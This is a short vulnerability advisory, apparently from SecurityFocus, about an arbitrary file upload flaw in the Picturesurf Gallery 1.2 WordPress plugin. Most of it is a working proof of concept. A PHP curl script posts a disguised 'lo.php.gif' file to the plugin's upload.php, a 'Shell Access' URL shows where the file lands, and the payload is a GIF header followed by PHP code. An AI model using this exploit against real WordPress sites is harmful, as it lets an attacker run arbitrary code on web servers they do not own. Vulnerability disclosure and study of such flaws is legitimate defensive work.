source: http://www.securityfocus.com/bid/53894/info

Picturesurf Gallery plugin is prone to a vulnerability that lets attackers upload arbitrary files. The issue occurs because the application fails to adequately sanitize user-supplied input.

An attacker can exploit this issue to upload arbitrary PHP code and run it in the context of the Web server process. This may facilitate unauthorized access or privilege escalation; other attacks are also possible.

Picturesurf Gallery 1.2 is vulnerable; other versions may also be affected.

PostShell.php
<?php

$uploadfile="lo.php.gif";
$ch =
curl_init("http://www.exemple.com/wordpress/wp-content/plugins/picturesurf-gallery/upload.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('Filedata'=>"@$uploadfile",
'is_simple'=>'is_simple'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);
print "$postResult";

?>

Shell Access :
http://www.exemple.com/wordpress/wp-content/plugins/picturesurf-gallery/data/upload/lo.php.gif

lo.php.gif
GIF89a???????????!??????,???????D?;?
<?php
phpinfo();
?>